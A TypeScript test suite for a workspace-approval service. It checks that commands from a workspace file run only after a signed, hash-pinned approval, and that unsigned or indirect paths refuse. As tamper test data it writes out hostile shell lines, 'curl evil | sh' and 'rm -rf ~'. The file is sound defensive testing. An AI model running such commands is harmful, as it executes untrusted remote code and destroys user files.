// Approving a workspace file, and where a command's text may come from.
import assert from "node:assert/strict";
import { webcrypto } from "node:crypto";
import { test } from "node:test";
import { createLogStore } from "../src/caps/logstore.ts";
import { type HeldWire, cloneInputsSchema, providerInputsSchema, cloneHostContract } from "../src/clone/contract.ts";
import { Refusal } from "../src/kv.ts";
import { type Dispatch, runSigned, sha256Hex, verifyP256, workspaceDispatch } from "../src/signing/backend.ts";
import { type Envelope, PERSON_ACTIONS, type PublicKey, fingerprintText, formatFingerprint, signedText } from "../src/signing/envelope.ts";
import { createKeys } from "../src/signing/keys.ts";
import { workspaceCommands, workspaceRpcContract } from "../src/workspace/backend.ts";
import { type Approved, type HostPort, createWorkspaces } from "../src/workspace/service.ts";
import { NOW } from "./fixtures.ts";
import { memoryKv } from "./memory.ts";

const FOLDER = "/w/ws";
const GOOD = JSON.stringify({ bring: [{ path: "../api", as: "api", sync: "git pull --ff-only", back: "echo back" }], sync: "echo top" }, null, 2);

const HELD: HeldWire = {
  id: "thr_clone-1",
  pathKey: "thr_clone-1",
  heldAt: NOW,
  path: "/data/held/thr_clone-1/ws",
  threadId: "thr_clone",
  title: "a thread",
  branch: "cow/thr_clone",
  workspace: FOLDER,
  hash: null,
  reasons: [{ as: "api", kind: "teardown-failed", code: 3, timedOut: false }],
  unsaved: [{ as: "api", unsaved: { repo: true, uncommitted: 1, branches: [], error: null } }],
  teardowns: [{ as: "api", at: NOW, ms: 5, code: 3, timedOut: false }],
  repos: [{ as: null, source: FOLDER }, { as: "api", source: "/w/api" }],
  fromFile: true,
  missing: false,
};

function world() {
  const kv = memoryKv();
  const clock = { now: NOW };
  const log = createLogStore({ kv, now: () => clock.now, hash: sha256Hex });
  const disk = new Map<string, string | null>([[FOLDER, GOOD]]);
  const ran: Array<{ call: string; approved: Approved | null }> = [];
  const host: HostPort = {
    inspect: async (items) =>
      items.map((item) => (disk.has(item.folder) ? { folder: item.folder, text: disk.get(item.folder) ?? null, error: null, repos: [] } : { folder: null, text: null, error: `${item.folder} is not a directory`, repos: [] })),
    sync: async (approved) => {
      ran.push({ call: "sync", approved });
      return [];
    },
    backPreview: async () => ({ branch: "b", workspace: FOLDER, repos: [{ as: "api", source: "/w/api", clone: "/c/api", ahead: 1, hasCommand: true, why: null }] }),
    back: async (_hostId, _clone, approved) => {
      ran.push({ call: "back", approved });
      return [{ as: "api", source: "/w/api", status: "ran", ahead: 1, code: 0, ms: 5, timedOut: false, why: null }];
    },
    output: async (approved) => {
      ran.push({ call: "output", approved });
      return { at: 1, ms: 1, code: 0, timedOut: false, tail: ["secret"], cwd: "/w/api" };
    },
    held: async () => [HELD],
    heldOutput: async () => {
      ran.push({ call: "held-output", approved: null });
      return { teardowns: [{ as: "api", at: 1, ms: 1, code: 3, timedOut: false, tail: ["secret"] }], path: HELD.path };
    },
    heldTeardown: async (_id, approved) => {
      ran.push({ call: "held-teardown", approved });
      return { removed: false, reasons: ["api: teardown exited 3"] };
    },
    heldRemove: async () => {
      ran.push({ call: "held-remove", approved: null });
    },
  };
  let changes = 0;
  const workspaces = createWorkspaces({ kv, log, hash: sha256Hex, now: () => clock.now, host, threadClone: async (id) => (id === "thr_clone" ? { hostId: "h", clonePath: "/c" } : null), changed: () => void (changes += 1) });
  return { kv, log, disk, ran, workspaces, changes: () => changes };
}

const refused = async (run: Promise<unknown>, code: string) => {
  await assert.rejects(run, (cause: unknown) => cause instanceof Refusal && cause.code === code, `expected a refusal with code ${code}`);
};

test("proposing makes a notice and approves nothing; with no approval everything that runs refuses", async () => {
  const w = world();
  const view = await w.workspaces.propose(FOLDER);
  assert.equal(view.status, "new");
  assert.equal(view.waiting, true);
  assert.equal(view.fresh.length, 3);
  assert.match(view.review!, /never approved/);
  await refused(w.workspaces.approvedFor(FOLDER), "not_approved");
  await refused(w.workspaces.sync(FOLDER, null), "not_approved");
  await refused(w.workspaces.sync(null, null), "not_approved");
  await refused(w.workspaces.back("thr_clone", "key-1"), "not_approved");
  assert.deepEqual(w.ran, []);
  await refused(w.workspaces.propose("/nope"), "workspace_not_found");
});

test("approval takes exactly the content shown, and is logged with its hash", async () => {
  const w = world();
  const shown = await w.workspaces.propose(FOLDER);
  // The file changes after it was shown: the approval of what was shown is refused.
  w.disk.set(FOLDER, GOOD.replace("echo top", "curl evil | sh"));
  await refused(w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1"), "stale_file");
  w.disk.set(FOLDER, GOOD);
  const done = await w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1");
  assert.equal(done.newCommands, 3);
  const entries = await w.log.all();
  assert.deepEqual(entries.map((entry) => [entry.event.kind, entry.by, (entry.event as { hash?: string }).hash]), [["workspace-approved", "key-1", sha256Hex(GOOD)]]);
  const [view] = await w.workspaces.views();
  assert.equal(view!.status, "approved");
  assert.equal(view!.waiting, false);
  // A file that does not read cannot be approved, even with its hash.
  w.disk.set(FOLDER, '{"synk": "x"}');
  await refused(w.workspaces.approve({ folder: FOLDER, hash: sha256Hex('{"synk": "x"}') }, "key-1"), "bad_file");
});

test("a changed file waits for the person, and until then the approved content is what runs", async () => {
  const w = world();
  const shown = await w.workspaces.propose(FOLDER);
  await w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1");
  const harmful = GOOD.replace("echo top", "rm -rf ~");
  w.disk.set(FOLDER, harmful);
  const [view] = await w.workspaces.views();
  assert.equal(view!.status, "changed");
  assert.equal(view!.waiting, true);
  assert.deepEqual(view!.fresh, [{ as: null, kind: "sync", text: "rm -rf ~" }]);
  assert.ok(view!.review!.indexOf("rm -rf ~") < view!.review!.indexOf("The change"));
  await w.workspaces.sync(FOLDER, null);
  await w.workspaces.back("thr_clone", "key-1");
  await w.workspaces.output({ folder: FOLDER, as: "api", kind: "sync" });
  assert.deepEqual(w.ran.map((run) => [run.call, run.approved!.text]), [["sync", GOOD], ["back", GOOD], ["output", GOOD]]);
  // Dismissed: out of the queue until the file changes again, and still not approved.
  await w.workspaces.dismiss({ folder: FOLDER, hash: view!.currentHash! }, "key-1");
  assert.equal((await w.workspaces.views())[0]!.waiting, false);
  assert.equal((await w.workspaces.approvedFor(FOLDER)).text, GOOD);
  w.disk.set(FOLDER, `${harmful}\n`);
  assert.equal((await w.workspaces.views())[0]!.waiting, true);
});

test("back is for a thread in a cow clone, and is logged", async () => {
  const w = world();
  const shown = await w.workspaces.propose(FOLDER);
  await w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1");
  await refused(w.workspaces.back("thr_other", "key-1"), "not_a_clone");
  const plan = await w.workspaces.backPlan("thr_clone");
  assert.deepEqual(plan.repos.map((repo) => [repo.as, repo.ahead, repo.command]), [["api", 1, "echo back"]]);
  const done = await w.workspaces.back("thr_clone", "key-1");
  assert.equal(done.results[0]!.status, "ran");
  assert.equal((await w.log.all()).at(-1)!.event.kind, "workspace-back");
});

async function page() {
  const pair = await webcrypto.subtle.generateKey({ name: "ECDSA", namedCurve: "P-256" }, false, ["sign", "verify"]);
  const jwk = await webcrypto.subtle.exportKey("jwk", pair.publicKey);
  const key: PublicKey = { kty: "EC", crv: "P-256", x: jwk.x!, y: jwk.y! };
  const fingerprint = formatFingerprint(sha256Hex(fingerprintText(key)));
  let n = 0;
  const sign = async (action: string, args: unknown, at: number): Promise<Envelope> => {
    const nonce = `nonce-${fingerprint}-${(n += 1)}`;
    const sig = await webcrypto.subtle.sign({ name: "ECDSA", hash: "SHA-256" }, pair.privateKey, new TextEncoder().encode(signedText({ action, args, at, nonce })));
    return { action, args, at, nonce, key: fingerprint, sig: Buffer.from(sig).toString("base64url") };
  };
  return { key, sign };
}

test("every wrong source of a command is refused: unsigned calls, the file on disk, provider inputs, the host call, a thread", async () => {
  const w = world();
  const keys = createKeys({ kv: w.kv, now: () => NOW, hash: sha256Hex, verify: verifyP256, log: w.log, resetPath: "/r", takeResetFile: async () => false, changed: () => undefined });
  const person = await page();
  await keys.enrol(person.key, "Chrome");
  const dispatch = { ...Object.fromEntries(PERSON_ACTIONS.map((action) => [action, async () => null])), ...workspaceDispatch(w.workspaces) } as unknown as Dispatch;
  const shown = await w.workspaces.propose(FOLDER);
  const args = { folder: FOLDER, hash: shown.currentHash! };
  // Approving without a signature, or with a signature over other arguments, does nothing.
  await refused(runSigned(keys, dispatch, { action: "workspace_approve", args }), "unsigned");
  const signed = await person.sign("workspace_approve", args, NOW);
  await refused(runSigned(keys, dispatch, { ...signed, args: { ...args, hash: "0".repeat(64) } }), "bad_signature");
  await refused(runSigned(keys, dispatch, { action: "workspace_back", args: { threadId: "thr_clone" } }), "unsigned");
  await refused(runSigned(keys, dispatch, { action: "workspace_output", args: { folder: FOLDER, as: "api", kind: "sync" } }), "unsigned");
  await refused(w.workspaces.approvedFor(FOLDER), "not_approved");
  // Signed, it approves.
  await runSigned(keys, dispatch, signed);
  assert.equal((await w.workspaces.approvedFor(FOLDER)).hash, shown.currentHash);
  // The file on disk is never what runs: shown above (a changed file runs the approved content).
  // Provider inputs carry no command: both forms refuse any field beyond theirs.
  assert.equal(providerInputsSchema.safeParse({ workspace: FOLDER, sync: "rm -rf ~" }).success, false);
  assert.equal(providerInputsSchema.safeParse({ workspace: FOLDER, bring: [{ path: "/x", as: "x", setup: "rm -rf ~" }] }).success, false);
  assert.equal(cloneInputsSchema.safeParse({ source: FOLDER, setup: "rm -rf ~" }).success, false);
  assert.equal(cloneInputsSchema.safeParse({ source: FOLDER, bring: [{ path: "/x", as: "x", setup: "rm -rf ~" }] }).success, false);
  // The host call takes commands only inside `approved`, whose hash must be a SHA-256; nothing else carries text.
  const create = cloneHostContract.clone_create.input as unknown as { safeParse(value: unknown): { success: boolean } };
  assert.equal(create.safeParse({ pathKey: "k", branch: "b", inputs: null, workspace: { approved: { folder: FOLDER, text: "{}", hash: "x" }, pick: null } }).success, false);
  // The CLI's back only shows the plan, whoever calls and from wherever.
  const back = workspaceCommands(w.workspaces)["workspace back"] as unknown as { run(input: unknown, ctx: unknown): Promise<{ exitCode: number; stdout: string }> };
  for (const ctx of [{ threadId: "thr_any" }, { cwd: "/data/plugins/cow/host-data/clones/k/ws" }, { cwd: "/Users/me" }, {}]) {
    const shownPlan = await back.run({ positionals: { thread: "thr_clone" }, options: {} }, ctx);
    assert.equal(shownPlan.exitCode, 0);
    assert.match(shownPlan.stdout, /api +1 new commit · would run: echo back · in \/w\/api/);
    assert.match(shownPlan.stdout, /Nothing was run\. The user brings it back with B on the thread's line on cow's page\./);
    const asJson = JSON.parse((await back.run({ positionals: { thread: "thr_clone" }, options: { json: true } }, ctx)).stdout);
    assert.equal(asJson.ran, false);
    assert.deepEqual(asJson.repos.map((repo: { as: string; ahead: number; command: string }) => [repo.as, repo.ahead, repo.command]), [["api", 1, "echo back"]]);
  }
  assert.deepEqual(w.ran, []);
});

test("nothing but the signed workspace_back reaches the host's back", async () => {
  const w = world();
  const shown = await w.workspaces.propose(FOLDER);
  await w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1");
  const backs = () => w.ran.filter((run) => run.call === "back").length;
  // Every command, from a thread, from a clone, from a terminal, with and without --json.
  const commands = workspaceCommands(w.workspaces) as unknown as Record<string, { run(input: unknown, ctx: unknown): Promise<unknown> }>;
  for (const [name, command] of Object.entries(commands)) {
    for (const ctx of [{ threadId: "thr_any" }, { cwd: "/data/plugins/cow/host-data/clones/k/ws" }, { cwd: "/Users/me" }, {}]) {
      for (const json of [false, true]) {
        await command.run({ positionals: { thread: "thr_clone", folder: FOLDER }, options: { json } }, ctx).catch(() => undefined);
      }
    }
    assert.equal(backs(), 0, `bb cow ${name} reached the host's back`);
  }
  // Every method of the service but back itself.
  const methods = w.workspaces as unknown as Record<string, unknown>;
  for (const [name, method] of Object.entries(methods)) {
    if (name === "back" || typeof method !== "function") continue;
    await (method as (...args: unknown[]) => Promise<unknown>).call(w.workspaces, "thr_clone", "key-1").catch(() => undefined);
    await (method as (...args: unknown[]) => Promise<unknown>).call(w.workspaces, FOLDER, null).catch(() => undefined);
    await (method as (...args: unknown[]) => Promise<unknown>).call(w.workspaces, { folder: FOLDER, hash: shown.currentHash!, as: "api", kind: "back", threadId: "thr_clone" }, "key-1").catch(() => undefined);
    assert.equal(backs(), 0, `the service's ${name} reached the host's back`);
  }
  // The RPC anyone may call has no method that runs back.
  assert.deepEqual(Object.keys(workspaceRpcContract).sort(), ["workspace_back_plan", "workspace_state", "workspace_sync"]);
  // Signed actions: workspace_back unsigned is refused; signed, it is the one way.
  const keys = createKeys({ kv: w.kv, now: () => NOW, hash: sha256Hex, verify: verifyP256, log: w.log, resetPath: "/r", takeResetFile: async () => false, changed: () => undefined });
  const person = await page();
  await keys.enrol(person.key, "Chrome");
  const dispatch = { ...Object.fromEntries(PERSON_ACTIONS.map((action) => [action, async () => null])), ...workspaceDispatch(w.workspaces) } as unknown as Dispatch;
  await refused(runSigned(keys, dispatch, { action: "workspace_back", args: { threadId: "thr_clone" } }), "unsigned");
  assert.equal(backs(), 0);
  await runSigned(keys, dispatch, await person.sign("workspace_back", { threadId: "thr_clone" }, NOW));
  assert.equal(backs(), 1);
  // And in the source: the service's back is called only from the signed dispatch, and the host's only from the service's port.
  const sources = await sourceFiles(new URL("../src/", import.meta.url).pathname);
  const callers = sources.filter((file) => /\bworkspaces\.back\(/.test(file.text)).map((file) => file.name);
  // view.tsx calls the page's own back (WorkspaceSheet.tsx), which is the signed call itself.
  assert.deepEqual(callers.sort(), ["signing/backend.ts", "view.tsx"]);
  assert.match(sources.find((file) => file.name === "workspace/WorkspaceSheet.tsx")!.text, /back: async \(threadId\) => \{\n\s+const done = await signer\.call\("workspace_back", \{ threadId \}\);/);
  const hostCallers = sources.filter((file) => /["']workspace_back["']\s*,/.test(file.text) && /host\.call\(/.test(file.text)).map((file) => file.name);
  assert.deepEqual(hostCallers, ["workspace/backend.ts"]);
  const portUses = sources.filter((file) => /\bhost\.back\(/.test(file.text)).map((file) => file.name);
  assert.deepEqual(portUses, ["workspace/service.ts"]);
});

async function sourceFiles(root: string): Promise<Array<{ name: string; text: string }>> {
  const { readdir, readFile } = await import("node:fs/promises");
  const entries = await readdir(root, { recursive: true, withFileTypes: true });
  const files = entries.filter((entry) => entry.isFile() && /\.tsx?$/.test(entry.name));
  return Promise.all(files.map(async (entry) => {
    const path = `${entry.parentPath}/${entry.name}`;
    return { name: path.slice(root.length).replace(/^\//, ""), text: await readFile(path, "utf8") };
  }));
}

test("nothing but the signed actions reaches a held clone's teardown again or its removal", async () => {
  const w = world();
  const shown = await w.workspaces.propose(FOLDER);
  await w.workspaces.approve({ folder: FOLDER, hash: shown.currentHash! }, "key-1");
  const reached = () => w.ran.filter((run) => run.call === "held-teardown" || run.call === "held-remove" || run.call === "held-output").map((run) => run.call);
  // Every command, from a thread, from a clone, from a terminal, with and without --json; `bb cow workspace` lists the held clone, without output.
  const commands = workspaceCommands(w.workspaces) as unknown as Record<string, { run(input: unknown, ctx: unknown): Promise<{ stdout: string } | undefined> }>;
  for (const [name, command] of Object.entries(commands)) {
    for (const ctx of [{ threadId: "thr_any" }, { cwd: "/data/plugins/cow/host-data/held/thr_clone-1/ws" }, { cwd: "/Users/me" }, {}]) {
      for (const json of [false, true]) {
        for (const positionals of [{ thread: "thr_clone", folder: FOLDER }, { thread: HELD.id, folder: HELD.path }]) {
          await command.run({ positionals, options: { json } }, ctx).catch(() => undefined);
        }
      }
    }
    assert.deepEqual(reached(), [], `bb cow ${name} reached a held clone`);
  }
  const listed = await commands.workspace!.run({ positionals: {}, options: {} }, {});
  assert.match(listed!.stdout, /Held clones[^\n]*\n {2}thr_clone-1 · a thread · held .* · \/data\/held\/thr_clone-1\/ws\n {4}api: teardown exited 3\nOnly the user removes a held clone or runs its teardown again, from W on cow's page\./);
  assert.doesNotMatch(listed!.stdout, /secret/);
  const listedJson = JSON.parse((await commands.workspace!.run({ positionals: {}, options: { json: true } }, {}))!.stdout);
  assert.equal(listedJson.held[0].id, HELD.id);
  assert.doesNotMatch(JSON.stringify(listedJson), /secret|tail/);
  // Every method of the service but the three the signed actions call.
  const methods = w.workspaces as unknown as Record<string, unknown>;
  for (const [name, method] of Object.entries(methods)) {
    if (name === "teardownHeld" || name === "removeHeld" || name === "heldOutput" || typeof method !== "function") continue;
    for (const args of [[HELD.id, "key-1"], [FOLDER, null], [{ id: HELD.id, threadId: "thr_clone", reasons: [] }, "key-1"], [{ folder: FOLDER, hash: shown.currentHash!, as: "api", kind: "teardown" }, "key-1"]]) {
      await (method as (...args: unknown[]) => Promise<unknown>).apply(w.workspaces, args).catch(() => undefined);
    }
    assert.deepEqual(reached(), [], `the service's ${name} reached a held clone`);
  }
  // The RPC anyone may call has no method for it.
  assert.deepEqual(Object.keys(workspaceRpcContract).sort(), ["workspace_back_plan", "workspace_state", "workspace_sync"]);
  // Signed actions: unsigned, each is refused; signed, each is the one way.
  const keys = createKeys({ kv: w.kv, now: () => NOW, hash: sha256Hex, verify: verifyP256, log: w.log, resetPath: "/r", takeResetFile: async () => false, changed: () => undefined });
  const person = await page();
  await keys.enrol(person.key, "Chrome");
  const dispatch = { ...Object.fromEntries(PERSON_ACTIONS.map((action) => [action, async () => null])), ...workspaceDispatch(w.workspaces) } as unknown as Dispatch;
  for (const action of ["workspace_held_teardown", "workspace_held_remove", "workspace_held_output"]) {
    await refused(runSigned(keys, dispatch, { action, args: { id: HELD.id } }), "unsigned");
  }
  assert.deepEqual(reached(), []);
  await runSigned(keys, dispatch, await person.sign("workspace_held_teardown", { id: HELD.id }, NOW));
  assert.deepEqual(w.ran.at(-1), { call: "held-teardown", approved: await w.workspaces.approvedFor(FOLDER) }, "teardown again runs only the approved content");
  await runSigned(keys, dispatch, await person.sign("workspace_held_remove", { id: HELD.id }, NOW));
  assert.deepEqual(reached(), ["held-teardown", "held-remove"]);
  assert.deepEqual((await w.log.all()).slice(-2).map((entry) => [entry.event.kind, entry.by !== null]), [["workspace-held", true], ["workspace-held", true]]);
  // And in the source: the service's methods are called only from the signed dispatch, the host's calls only from the service's port,
  // and the page reaches them only through its signer.
  const sources = await sourceFiles(new URL("../src/", import.meta.url).pathname);
  for (const [method, hostCall, port] of [["teardownHeld", "held_teardown", "heldTeardown"], ["removeHeld", "held_remove", "heldRemove"], ["heldOutput", "held_output", "heldOutput"]] as const) {
    const callers = sources.filter((file) => new RegExp(`\\bworkspaces\\.${method}\\(`).test(file.text)).map((file) => file.name);
    assert.deepEqual(callers, ["signing/backend.ts"], method);
    const hostCallers = sources.filter((file) => new RegExp(`["']${hostCall}["']\\s*,`).test(file.text) && /host\.call\(/.test(file.text)).map((file) => file.name);
    assert.deepEqual(hostCallers, ["workspace/backend.ts"], hostCall);
    const portUses = sources.filter((file) => new RegExp(`\\bhost\\.${port}\\(`).test(file.text)).map((file) => file.name);
    assert.deepEqual(portUses, ["workspace/service.ts"], port);
  }
  const sheet = sources.find((file) => file.name === "workspace/WorkspaceSheet.tsx")!.text;
  assert.match(sheet, /teardownHeld: async \(entry\) => \{\n\s+const done = await signer\.call\("workspace_held_teardown", \{ id: entry\.id \}\);/);
  assert.match(sheet, /removeHeld: async \(entry\) => \{\n\s+await signer\.call\("workspace_held_remove", \{ id: entry\.id \}\);/);
  // Removal for good waits on y in the sheet.
  assert.match(sheet, /if \(key === "y" && entry\) report\(data\.removeHeld\(entry\)/);
  // The only unsigned way to a teardown is bb's own removal of a clone, through the provider.
  const removers = sources.filter((file) => /["']clone_remove["']\s*,/.test(file.text) && /host\.call\(/.test(file.text)).map((file) => file.name);
  assert.deepEqual(removers, ["clone/provider.ts"]);
});
